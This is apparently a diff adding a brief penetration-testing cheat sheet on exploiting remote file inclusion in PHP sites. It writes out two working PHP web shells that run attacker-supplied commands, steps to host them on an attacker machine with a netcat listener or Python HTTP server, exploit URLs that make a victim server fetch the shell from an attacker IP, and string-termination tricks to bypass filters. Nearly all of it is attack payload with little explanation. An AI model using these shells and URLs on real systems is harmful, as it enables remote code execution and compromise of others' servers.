@@ -1,0 +1,24 @@
+1. nc -nlvp 80
+2. vi test.php
+
+<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x'])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? die(); ?>
+
+3. http://target/xxx.php?http://10.11.0.199/test.php
+
+OR
+
+0. create and save file.php 
+<?php 
+  system($_GET['c']);
+?>
+1. python -m SimpleHTTPServer 80
+2. http://victim.com/vuln.php?page=<attacker_IP>&c=id
+
+NOTES:
+1. To terminate RFI string use either:
+?blah=aa OR &blah=aa OR %00
+eg: http://victim.com/vuln.php?page=<attacker_IP>&%00&c=id
+
+Equivalent to localhost:
+0.0.0.0
+127.0.0.1
